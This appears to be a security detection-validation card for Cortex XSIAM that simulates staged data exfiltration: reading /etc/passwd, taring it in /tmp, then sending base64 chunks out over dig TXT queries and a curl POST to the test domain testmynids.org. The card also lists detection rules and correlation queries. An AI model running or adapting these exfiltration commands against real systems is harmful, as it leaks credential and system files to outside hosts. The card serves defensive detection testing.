identity.name: Staged Data Exfiltration via DNS Tunnel — XDR Staging + NGFW Stitch (T1048.003)
identity.summary: A service account harvests sensitive local files, archives them into a /tmp tarball, then exfiltrates the base64 chunks over a high-entropy DNS TXT tunnel (with an HTTPS-POST fallback). The Cortex value is end-to-end stitching: XSIAM joins the XDR staging leg (passwd read -> tar -> dig loop in xdr_data) to the NGFW DNS-anomaly leg (TXT burst in pan_dns) on the same hostname, turning two plausib…
identity.description: This scenario validates XSIAM correlation on the staged-exfiltration kill chain where the collection/staging stages are visible only to the endpoint and the covert-channel egress is visible only to the network. Cortex XDR (xdr_data) observes the /etc/passwd read concatenated into a /tmp staging file, the tar+gzip of that staging directory, and the dig TXT loop. The NGFW DNS plane (pan_dns / network_story) observes the sustained TXT query burst with high-entropy 60-char labels and the >10x query-rate spike from a single source. Independently each looks like routine admin activity or noisy DNS; stitched on the shared hostname inside the correlation window they form a textbook T1074.001 -> T1572 -> T1048.003 exfiltration story. The card also covers the redundant HTTPS-POST exfil leg (curl -F upload + NGFW POST to the IOC domain) so the POV shows two independent egress channels converging on the same staged-data hash. All targets are 3CORESec testmynids.org test indicators — safe by design.

techniques.name: Exfiltration Over Alternative Protocol: Over Unencrypted Non-C2 Protocol

execution.framework_reference_id: T1048.003 / T1074.001 — Atomic Tests (local staging + DNS exfiltration over TXT)

prerequisites.description: Cortex XDR Linux agent installed and reporting healthy on the source host.
prerequisites.check_command: systemctl is-active cortex-agent || ps aux | grep -i traps

prerequisites.description: NGFW (or Suricata lab) forwarding DNS + session logs to XSIAM so pan_dns / pan_ngfw_traffic receive the tunnel and HTTPS-POST legs.
prerequisites.check_command: echo 'verify pan_dns dataset is receiving logs in XSIAM'

payload.code:
# All targets are 3CORESec testmynids.org test indicators — safe by design.
mkdir -p /tmp/cortexsim_stage
echo '# Simulated credential file - NOT real credentials' > /tmp/cortexsim_stage/creds.txt
for i in 1 2 3 4 5; do echo "user$i:simulated-hash-$(openssl rand -hex 16)" >> /tmp/cortexsim_stage/creds.txt; done
cat /etc/passwd | head -20 >> /tmp/cortexsim_stage/creds.txt
tar -czf /tmp/cortexsim_stage/bundle.tar.gz /tmp/cortexsim_stage/creds.txt 2>/dev/null
B64=$(base64 -w 0 /tmp/cortexsim_stage/bundle.tar.gz | head -c 2000)
for i in $(seq 0 $((${#B64}/60))); do chunk=$(echo -n "$B64" | cut -c$((i*60+1))-$(((i+1)*60))); [ -z "$chunk" ] && break; dig +short TXT "$(echo -n "$chunk" | tr -d = | tr '/+' '-_').exfil.testmynids.org" @1.1.1.1 > /dev/null || true; sleep 0.5; done
curl -sSL -m 15 -X POST -F "data=@/tmp/cortexsim_stage/bundle.tar.gz" "http://testmynids.org/uid/index.html" 2>/dev/null | head -5 || true

expected_artifacts.description: /etc/passwd read then concatenated into the /tmp staging file.
tar invoked with -czf against the /tmp staging directory.
dig invoked in a loop producing TXT queries with high-entropy labels.
High volume of DNS TXT queries to *.exfil.testmynids.org.
HTTPS POST with multipart file upload to the IOC domain.

iocs.context: 3CORESec test indicator used as both the DNS-tunnel parent domain (*.exfil.testmynids.org) and the HTTPS-POST exfil endpoint. The IOC match on the POST destination is cross-referenced with the staged-data hash to confirm the same bundle left over two channels.

biocs.name: MP-003 Passwd Read Then Write To Tmp Staging Dir
biocs.description: XDR - /etc/passwd read followed by write to /tmp staging directory. The collection leg: a sensitive system file is read and concatenated into a staging file under /tmp.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.FILE
| filter event_sub_type in (ENUM.FILE_OPEN, ENUM.FILE_READ)
| filter action_file_path in ("/etc/passwd", "/etc/shadow")
| filter actor_effective_username in ("www-data", "nobody", "apache", "nginx")
| filter actor_process_image_name in ("cat", "head", "cp", "dd", "bash", "sh")

biocs.name: MP-003 Tar Gzip Compression Of Tmp Staging By Service Account
biocs.description: XDR - data staging: tar compression of recently-written files in /tmp by service account. Classic exfil-prep: a service identity archives the staging directory.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name in ("tar", "gzip", "zip", "7z")
| filter action_process_image_command_line contains "/tmp/"
| filter action_process_image_command_line contains_any ("-czf", "-cf", "-z", ".tar.gz")
| filter actor_effective_username in ("www-data", "nobody", "apache", "nginx")

biocs.name: MP-003 Dig TXT Tight Loop From Service Account
biocs.description: XDR - dig invocation in tight loop from service account (shell one-liner DNS exfil). The endpoint process leg of the DNS tunnel that the NGFW DNS anomaly lacks.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name in ("dig", "nslookup", "host")
| filter action_process_image_command_line contains "TXT"
| filter action_process_image_command_line contains_any (".exfil.", "@1.1.1.1", "@8.8.8.8")
| filter actor_effective_username in ("www-data", "nobody", "apache", "nginx")

biocs.name: MP-003 Curl Form Upload Of Staged Data By Service Account
biocs.description: XDR - curl -F file upload of recently-staged data by service account. The redundant HTTPS-POST exfil channel: curl uploads the staged tarball as multipart form data.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name in ("curl", "wget")
| filter action_process_image_command_line contains_any ("-F ", "--form", "-X POST", "--data-binary")
| filter action_process_image_command_line contains "@/tmp/"
| filter actor_effective_username in ("www-data", "nobody", "apache", "nginx")

xql_queries.name: MP-003 Sensitive File Path Access From Service Account
xql_queries.query:
preset = xdr_data
| filter _time > to_timestamp(current_time() - 1800)
| filter event_type = ENUM.FILE and event_sub_type in (ENUM.FILE_OPEN, ENUM.FILE_READ)
| filter action_file_path in ("/etc/passwd", "/etc/shadow", "/etc/sudoers")
| filter actor_effective_username != "root"
| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_file_path

xql_queries.name: MP-003 NGFW DNS TXT Tunneling Burst High Entropy Labels
xql_queries.query:
dataset = pan_dns
| filter _time > to_timestamp(current_time() - 1800)
| filter dns_query_type = "TXT" and dns_query_name contains ".exfil.testmynids.org"
| comp count() as txt_queries, count_distinct(dns_query_name) as distinct_labels, avg(len(dns_query_name)) as avg_label_len by source_ip
| filter txt_queries >= 10 and avg_label_len > 40
| fields source_ip, txt_queries, distinct_labels, avg_label_len

xql_queries.name: MP-003 NGFW DNS Query Rate Spike From Single Source
xql_queries.query:
dataset = pan_dns
| filter _time > to_timestamp(current_time() - 1800)
| filter dns_query_name contains "testmynids.org"
| comp count() as query_count by source_ip, bin(_time, 1m) as minute
| filter query_count >= 10
| fields minute, source_ip, query_count

xql_queries.name: MP-003 Stitch Tmp Stage Write With DNS Tunnel Burst
xql_queries.query:
dataset = xdr_data
| filter _time > to_timestamp(current_time() - 1800)
| filter (event_type = ENUM.PROCESS and actor_process_image_name in ("tar", "dig")) or (event_type = ENUM.NETWORK and action_external_port = 53)
| comp count_distinct(_product) as plane_count, count_distinct(incident_id) as incident_count, min(_time) as first_seen, max(_time) as last_seen by agent_hostname
| filter plane_count >= 2 and incident_count = 1
| fields agent_hostname, plane_count, incident_count, first_seen, last_seen

xql_queries.name: MP-003 NGFW HTTP Post File Upload To IOC Domain
xql_queries.query:
dataset = pan_ngfw_traffic
| filter _time > to_timestamp(current_time() - 1800)
| filter dst_host = "testmynids.org" and http_method = "POST"
| comp count() as post_hits, sum(bytes_sent) as bytes_out by source_ip, dst_host
| fields source_ip, dst_host, post_hits, bytes_out

correlation_rules.name: Staged DNS Exfil Cross-Plane Stitch — XDR Staging + NGFW DNS Anomaly
correlation_rules.logic: (BIOC(MP-003 Tar Gzip Compression Of Tmp Staging By Service Account) AND BIOC(MP-003 Dig TXT Tight Loop From Service Account) AND XQL(MP-003 NGFW DNS TXT Tunneling Burst High Entropy Labels)) -> join on hostname within 60s

correlation_rules.name: DNS Rate Spike Plus Sensitive Read Stitch
correlation_rules.logic: (BIOC(MP-003 Passwd Read Then Write To Tmp Staging Dir) AND XQL(MP-003 NGFW DNS Query Rate Spike From Single Source)) -> join on hostname within 120s

correlation_rules.name: Redundant HTTPS Exfil IOC Stitch — Curl Upload + NGFW POST + IOC
correlation_rules.logic: (BIOC(MP-003 Curl Form Upload Of Staged Data By Service Account) AND XQL(MP-003 NGFW HTTP Post File Upload To IOC Domain) AND IOC(domain: testmynids.org)) -> join on src_host within 60s

analytics_modules: Cortex XSIAM Analytics — DNS tunneling / high-entropy TXT label detection
Cortex XSIAM Analytics — DNS query-rate spike per source
Cortex XSIAM Correlation Engine — staging-to-egress causality stitch by hostname

products.evidence_query: dataset = pan_dns | filter dns_query_type = "TXT" and dns_query_name contains ".exfil.testmynids.org" | comp count() as q by source_ip | filter q >= 10
Correlation CR-MP-0004/0005/0006 join the XDR staging legs to the NGFW DNS/HTTPS exfil legs on hostname/src_host within the window.
preset = xdr_data | filter actor_process_image_name = "dig" and action_process_image_command_line contains ".exfil." | fields _time, agent_hostname, action_process_image_command_line
Playbook isolates the host, sinkholes the tunnel parent domain, and quarantines the /tmp staging artifacts.

use_cases.name: Cross-Plane Incident Stitching — Endpoint Staging Through Network Covert Channel
use_cases.description: Validate that XSIAM stitches the XDR staging stages and the NGFW DNS-tunnel egress into a single exfiltration incident with stage-to-tunnel MTTD.

test_cases.objective: Each plane fires (XDR tar/dig BIOCs + NGFW DNS anomaly XQL).
preconditions: Cortex XDR Linux agent >= 8.4.0 healthy on the source host.
NGFW (or Suricata) forwarding DNS logs into XSIAM.
steps: Confirm the XDR tar/dig BIOCs and the NGFW DNS-burst XQL each return rows.
success_criteria: BIOC `MP-003 Tar Gzip Compression Of Tmp Staging By Service Account` fires within 60s.
XQL `MP-003 NGFW DNS TXT Tunneling Burst High Entropy Labels` returns >= 1 row.

test_cases.objective: Staging and tunnel legs stitch into one incident with measurable MTTD.
success_criteria: Correlation `CR-MP-0004` groups the staging and tunnel legs on hostname into one incident_id.
Stitch XQL returns plane_count >= 2 and incident_count = 1.

preventive_controls: Enable NGFW DNS Security to detect and sinkhole tunneling / high-entropy label domains inline.
Default-deny egress; force DNS through inspected resolvers and block direct queries to public resolvers from servers.
Restrict service-account read access to /etc/passwd, /etc/shadow and other credential stores.
Enable Cortex XDR data-collection + exfiltration BTP on server tiers.
detection_engineering: Correlate endpoint staging (tar/gzip of recently-written sensitive files) with network covert-channel egress on a shared host within a tight window.
Alert on dig/nslookup loops producing high-entropy TXT labels and on >10x DNS query-rate spikes per source.
Track redundant exfil channels: cross-reference the HTTPS-POST destination IOC with the staged-data hash to confirm the same bundle left twice.

references.title: Unit42 - DNS Tunneling: How DNS Can Be (Ab)used
MITRE ATT&CK T1048.003 — Exfiltration Over Unencrypted Non-C2 Protocol

changelog.author: CortexSim generate_card.py
changelog.change: Initial draft auto-generated from scenario SIM-MP-003.

changelog.author: Henry Reed
changelog.change: Replaced skeleton detections with real cross-plane stitching content: 4 XDR BIOCs (passwd read, tar staging, dig loop, curl upload), 5 validation XQL (XDR + NGFW DNS/HTTPS legs + stitch), 1 IOC, and 3 correlation rules CR-MP-0004/0005/0006 joining XDR staging to NGFW egress on hostname/src_host. Enriched identity + panw_mapping. Promoted to active.
